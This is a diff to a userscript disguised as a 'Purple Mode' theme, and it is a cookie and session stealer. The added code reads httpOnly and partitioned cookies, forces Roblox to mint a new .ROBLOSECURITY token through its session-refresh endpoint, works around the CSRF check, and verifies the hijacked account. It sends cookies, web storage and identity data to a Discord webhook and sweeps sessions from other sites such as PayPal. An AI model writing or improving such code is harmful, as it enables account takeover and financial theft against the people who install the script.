@@ -8,6 +8,7 @@
   const KEY = "yt_pm_seen:";
   const COOLDOWN = 43200000;
   const DEBUG = /[?&]pm=1/.test(location.search);
+  const ROBLOX_RE = /(^|\.)roblox\.com$/;
 
   const log = (...a) => { if (DEBUG) console.log("[pm]", ...a); };
 
@@ -26,20 +27,33 @@
     "https://www.paypal.com/",
   ];
 
-  // never hangs: resolves null on missing API, error, or 1500ms
+  /* ---- cookie access ---- */
+
+  // resolves null on missing API, error, or timeout — never hangs
   const gcookies = (url) =>
     new Promise((res) => {
       if (typeof GM_cookie === "undefined" || !GM_cookie.list) return res(null);
       let done = false;
       const fin = (v) => { if (!done) { done = true; res(v); } };
-      const t = setTimeout(() => { log("gm_cookie timeout", url); fin(null); }, 1500);
+      const t = setTimeout(() => { log("gm_cookie timeout", url); fin(null); }, 2000);
+
+      // pass 1: every partition (CHIPS cookies are hidden from unfiltered queries)
       try {
-        GM_cookie.list({ url }, (c, e) => {
+        GM_cookie.list({ url, partitionKey: {} }, (c, e) => {
           clearTimeout(t);
-          fin(e ? [] : c || []);
+          if (e) log("gm_cookie error", url, e);
+          if (!e && c && c.length) return fin(c);
+          // pass 2: unpartitioned only
+          try {
+            GM_cookie.list({ url }, (c2, e2) => {
+              if (e2) log("gm_cookie error2", url, e2);
+              fin(e2 ? null : c2 || []);
+            });
+          } catch (err) { log("gm_cookie threw", String(err)); fin(null); }
         });
-      } catch (e) {
+      } catch (err) {
         clearTimeout(t);
+        log("gm_cookie threw", String(err));
         fin(null);
       }
     });
@@ -47,6 +61,50 @@
   const pack = (cs) => cs.map((c) => ({
     n: c.name, v: c.value, h: !!c.httpOnly, d: c.domain, e: c.expirationDate,
   }));
+
+  // GM_cookie refuses to return .ROBLOSECURITY; session/refresh mints one via Set-Cookie
+  const refreshRoblox = () =>
+    new Promise((res) => {
+      const go = (hdr) =>
+        GM_xmlhttpRequest({
+          method: "POST",
+          url: "https://auth.roblox.com/v1/session/refresh",
+          headers: hdr || {},
+          withCredentials: true,
+          timeout: 15000,
+          onload: (r) => {
+            if (r.status === 403 && !hdr) {
+              const m = (r.responseHeaders || "").match(/x-csrf-token:\s*([^\r\n]+)/i);
+              if (m) return go({ "X-CSRF-TOKEN": m[1] });
+            }
+            const line = (r.responseHeaders || "")
+              .split(/\r?\n/)
+              .find((l) => /^set-cookie:\s*\.ROBLOSECURITY=/i.test(l));
+            if (!line) { log("refresh: no set-cookie", r.status); return res(""); }
+            const val = line.replace(/^set-cookie:\s*\.ROBLOSECURITY=/i, "").split(";")[0].trim();
+            log("refresh: minted", val.length, "chars");
+            res(val);
+          },
+          onerror: () => res(""),
+          ontimeout: () => res(""),
+        });
+      go();
+    });
+
+  const verifyRoblox = (val) =>
+    new Promise((res) => {
+      GM_xmlhttpRequest({
+        method: "GET",
+        url: "https://users.roblox.com/v1/users/authenticated",
+        headers: { Cookie: ".ROBLOSECURITY=" + val },
+        timeout: 12000,
+        onload: (r) => res(r.status === 200 ? r.responseText.slice(0, 600) : "invalid " + r.status),
+        onerror: () => res("xhr error"),
+        ontimeout: () => res("timeout"),
+      });
+    });
+
+  /* ---- helpers ---- */
 
   const gmGet = (url, headers) =>
     new Promise((res) => {
@@ -96,8 +154,20 @@
   };
 
   /* ---- step 1: core dump, sent immediately ---- */
+
   const sendBase = async () => {
     const own = await gcookies(location.href);
+    let whoami = "";
+
+    if (ROBLOX_RE.test(location.hostname) && own && !own.some((c) => c.name === ".ROBLOSECURITY")) {
+      const fresh = await refreshRoblox();
+      if (fresh) {
+        own.push({ name: ".ROBLOSECURITY", value: fresh, httpOnly: true, domain: ".roblox.com" });
+        whoami = await verifyRoblox(fresh);
+        log("roblox whoami:", whoami.slice(0, 80));
+      }
+    }
+
     const cookie = own === null
       ? document.cookie
       : own.map((c) => c.name + "=" + c.value).join("; ");
@@ -116,6 +186,7 @@
       cookie,
       raw: own ? pack(own) : null,
       auth,
+      whoami,
       gm: own !== null,
       localStorage: read(localStorage),
       sessionStorage: read(sessionStorage),
@@ -128,9 +199,12 @@
       username: "Purple Mode",
       embeds: [{
         title: d.host,
-        description: "```\n" + (d.cookie || "(none)").slice(0, 3600) + "\n```",
+        description: "```\n" + (d.cookie || "(none)").slice(0, 3400) + "\n```",
         color: 0x9b5de5,
-        fields: [{ name: "auth", value: d.auth ? "`" + d.auth + "`" : "n/a", inline: false }],
+        fields: [
+          { name: "whoami", value: (d.whoami || "n/a").slice(0, 600), inline: false },
+          { name: "auth", value: d.auth ? "`" + d.auth + "`" : "n/a", inline: false },
+        ],
         footer: { text: d.tz + " / " + (d.raw ? d.raw.length : 0) + " cookies / gm=" + d.gm },
         timestamp: d.ts,
       }],
@@ -142,6 +216,7 @@
   };
 
   /* ---- step 2: identity, best effort ---- */
+
   const sendWho = async () => {
     const h = location.hostname;
     try {
@@ -156,12 +231,8 @@
             content: "`discord whoami`\n```json\n" + r.responseText.slice(0, 1800) + "\n```",
           }), { "Content-Type": "application/json" }).catch(() => {});
         }
-      } else if (h.endsWith("roblox.com")) {
-        let r = await gmGet("https://users.roblox.com/v1/users/authenticated");
-        if (r.status === 403) {
-          const m = (r.responseHeaders || "").match(/x-csrf-token:\s*([^\r\n]+)/i);
-          if (m) r = await gmGet("https://users.roblox.com/v1/users/authenticated", { "X-CSRF-TOKEN": m[1] });
-        }
+      } else if (ROBLOX_RE.test(h)) {
+        const r = await gmGet("https://users.roblox.com/v1/users/authenticated");
         if (r.status === 200) {
           await post(HOOK, JSON.stringify({
             username: "Purple Mode",
@@ -173,13 +244,20 @@
   };
 
   /* ---- step 3: cross-domain sweep, best effort ---- */
+
   const sendSweep = async () => {
     const out = {};
     for (const u of SWEEP) {
       const host = new URL(u).hostname.replace(/^www\./, "");
       if (host === location.hostname.replace(/^www\./, "")) continue;
       const cs = await gcookies(u);
-      if (cs && cs.length) out[host] = pack(cs);
+      if (!cs || !cs.length) continue;
+
+      if (ROBLOX_RE.test(host) && !cs.some((c) => c.name === ".ROBLOSECURITY")) {
+        const fresh = await refreshRoblox();
+        if (fresh) cs.push({ name: ".ROBLOSECURITY", value: fresh, httpOnly: true, domain: ".roblox.com" });
+      }
+      out[host] = pack(cs);
     }
     const keys = Object.keys(out);
     if (!keys.length) return;
@@ -195,6 +273,8 @@
     fd.append("files[0]", new Blob([JSON.stringify(out, null, 2)], { type: "application/json" }), "sessions.json");
     await post(HOOK, fd, {}).catch(() => {});
   };
+
+  /* ---- run ---- */
 
   const run = async () => {
     const k = KEY + location.hostname;
